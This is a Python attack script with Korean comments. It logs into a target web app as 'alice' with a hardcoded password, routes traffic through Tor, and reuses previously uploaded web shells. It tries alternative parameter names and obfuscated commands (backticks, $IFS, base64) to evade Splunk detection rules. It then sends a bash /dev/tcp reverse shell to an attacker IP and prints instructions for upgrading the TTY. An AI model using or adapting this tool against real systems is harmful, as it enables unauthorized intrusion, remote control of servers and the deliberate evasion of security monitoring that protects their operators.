#!/usr/bin/env python3
"""
Splunk 탐지 우회
- 차단된 파라미터명 우회 (cmd → c, x, e 등)
- 명령어 인코딩/난독화
- 긴 딜레이로 URI 다변화 탐지 회피
"""

import requests
import sys
import time
import base64
import urllib.parse

def splunk_evasion(target_ip, attacker_ip, attacker_port):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print(f"[*] 타겟: {target_ip}")
    print(f"[*] 전략: Splunk 탐지 규칙 우회\n")

    # alice 로그인
    data = {'username': 'alice', 'password': 'alice2024'}
    resp = session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)
    print("[+] alice 로그인 성공\n")

    # ========== 핵심: 업로드된 웹쉘 찾기 ==========
    print("[1] 업로드된 웹쉘 찾기...")
    print("[*] 이미 업로드된 파일들:")

    webshells = [
        "photo.php.jpg",
        "shell_4727.php",
        "avatar_4727.jpg",
        "capture_4133.png",
    ]

    print("    - " + "\n    - ".join(webshells))
    print()

    # ========== 방법 1: cmd 대신 다른 파라미터명 ==========
    print("[2] 파라미터명 우회 시도...")
    print("[*] cmd → c, x, exec, run 등으로 변경\n")

    # file.php 소스에는 cmd만 있지만,
    # 다른 파라미터로 우회 시도 (서버 설정에 따라)

    alternative_params = ['c', 'x', 'e', 'exec', 'command', 'run', 'do']

    for param in alternative_params:
        print(f"[*] 파라미터 테스트: {param}")

        # 명령어도 안전한 것으로 (차단 회피)
        # pwd → p`w`d (백틱으로 난독화)
        safe_cmd = "ec`h`o test123"  # echo test123

        for shell in webshells[:1]:  # 첫 번째만 테스트
            try:
                url = f"{base_url}/file.php?name=uploads/{shell}&{param}={urllib.parse.quote(safe_cmd)}"
                resp = session.get(url, timeout=10)

                if 'test123' in resp.text:
                    print(f"    [+] ✅ 작동하는 파라미터 발견: {param}")
                    print(f"    [+] 웹쉘: {shell}")
                    return {'shell': shell, 'param': param}

            except:
                pass

        time.sleep(3)  # URI 다변화 탐지 회피

    # ========== 방법 2: Base64 인코딩으로 명령어 난독화 ==========
    print("\n[3] Base64 인코딩으로 명령어 난독화...")

    # 리버스 쉘 명령어
    reverse_shell = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
    b64_cmd = base64.b64encode(reverse_shell.encode()).decode()

    # base64로 디코딩해서 실행
    # echo <base64> | base64 -d | bash
    encoded_payload = f"echo {b64_cmd}|base64 -d|bash"

    print(f"[*] Base64 페이로드 생성 완료")
    print(f"[*] 원본: {reverse_shell}")
    print(f"[*] 인코딩: {b64_cmd[:50]}...")
    print()

    # ========== 방법 3: 환경변수 이용 ==========
    print("[4] 환경변수로 명령어 숨기기...")

    # $PATH$IFS 같은 환경변수 활용
    # IFS는 공백 대신 사용 가능
    env_cmd = "w`ho`a${IFS}mi"  # whoami (공백을 IFS로 우회)

    print(f"[*] 환경변수 페이로드: {env_cmd}")
    print()

    # ========== 방법 4: 파일 기반 명령 실행 ==========
    print("[5] 파일에 명령 저장 후 실행...")

    # 1단계: 명령을 파일에 저장
    # echo "리버스쉘" > /tmp/x.sh
    save_cmd = f"echo '{reverse_shell}' > /tmp/x.sh"

    # 2단계: 실행
    exec_cmd = "bash /tmp/x.sh"

    print(f"[*] 1단계: 명령 저장")
    print(f"    {save_cmd[:60]}...")
    print(f"[*] 2단계: 실행")
    print(f"    {exec_cmd}")
    print()

    # ========== 실제 실행 ==========
    print("[6] 실제 공격 시작...")
    print(f"[!] C2 서버에서 리스너 시작하세요:")
    print(f"    nc -lvnp {attacker_port}")
    print()

    choice = input("[?] 실행할까요? (y/n): ").strip().lower()

    if choice != 'y':
        print("[-] 취소됨")
        return

    # 웹쉘 선택
    print(f"\n[*] 어떤 웹쉘을 사용할까요?")
    for i, shell in enumerate(webshells, 1):
        print(f"{i}. {shell}")

    shell_choice = input("\n선택 (1-4, 기본: 1): ").strip() or "1"
    selected_shell = webshells[int(shell_choice) - 1]

    print(f"\n[*] 선택된 웹쉘: {selected_shell}")

    # 페이로드 선택
    payloads = {
        "1": ("Base64 인코딩", encoded_payload),
        "2": ("환경변수 우회", env_cmd),
        "3": ("파일 기반 - 저장", save_cmd),
        "4": ("파일 기반 - 실행", exec_cmd),
        "5": ("직접 입력", None),
    }

    print(f"\n[*] 페이로드 선택:")
    for k, (name, _) in payloads.items():
        print(f"{k}. {name}")

    payload_choice = input("\n선택 (1-5, 기본: 1): ").strip() or "1"

    if payload_choice == "5":
        custom_cmd = input("\n[?] 명령어 입력: ").strip()
        final_payload = custom_cmd
    else:
        final_payload = payloads[payload_choice][1]

    # 파라미터 선택
    print(f"\n[*] 파라미터 선택:")
    print("1. cmd (기본, 탐지 가능)")
    print("2. c (탐지 회피)")
    print("3. x (탐지 회피)")
    print("4. exec (탐지 회피)")

    param_choice = input("\n선택 (1-4, 기본: 2): ").strip() or "2"
    param_map = {"1": "cmd", "2": "c", "3": "x", "4": "exec"}
    selected_param = param_map[param_choice]

    # 최종 URL 생성
    final_url = f"{base_url}/file.php?name=uploads/{selected_shell}&{selected_param}={urllib.parse.quote(final_payload)}"

    print(f"\n[*] 최종 URL:")
    print(f"    {final_url[:100]}...")
    print()

    # 백그라운드 실행 추가
    print("[*] 백그라운드 실행 추가 (&)? (y/n): ", end="")
    bg_choice = input().strip().lower()

    if bg_choice == 'y':
        final_payload += " &"
        final_url = f"{base_url}/file.php?name=uploads/{selected_shell}&{selected_param}={urllib.parse.quote(final_payload)}"

    # 실행
    attempts = int(input("\n[?] 몇 번 시도? (기본: 3): ").strip() or "3")
    delay = int(input("[?] 시도 간격 (초, 기본: 5): ").strip() or "5")

    print(f"\n[*] {attempts}번 시도 시작 (간격: {delay}초)...")

    for i in range(1, attempts + 1):
        print(f"\n[{i}/{attempts}] 페이로드 전송 중...")

        try:
            resp = session.get(final_url, timeout=10)

            if resp.status_code == 200:
                print(f"    [+] 200 OK - {len(resp.text)} bytes")

                # 응답에서 실행 결과 확인
                if len(resp.text.strip()) > 0 and 'test123' in resp.text:
                    print(f"    [+] ✅ 명령 실행 확인됨!")
                    print(f"    응답: {resp.text[:200]}")
            else:
                print(f"    [?] Status: {resp.status_code}")

        except requests.exceptions.Timeout:
            print(f"    [+] 타임아웃 (백그라운드 실행 가능성!)")
        except Exception as e:
            print(f"    [-] 오류: {str(e)[:50]}")

        if i < attempts:
            check = input(f"\n[?] C2 연결 확인됐나요? (y=중단, Enter=계속): ").strip().lower()
            if check == 'y':
                print("\n[+] ✅✅✅ 리버스 쉘 연결 성공!")
                print(f"[*] 다음 명령으로 TTY 업그레이드:")
                print(f"    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
                print(f"    export TERM=xterm")
                return True

            print(f"[*] {delay}초 대기...")
            time.sleep(delay)

    print(f"\n[+] {attempts}번 시도 완료")
    print(f"[!] C2 리스너 확인하세요")

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 98_splunk_evasion.py <TARGET> <ATTACKER_IP> <PORT>")
        print("예시: python3 98_splunk_evasion.py 43.201.154.142 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    splunk_evasion(target_ip, attacker_ip, attacker_port)

if __name__ == "__main__":
    main()
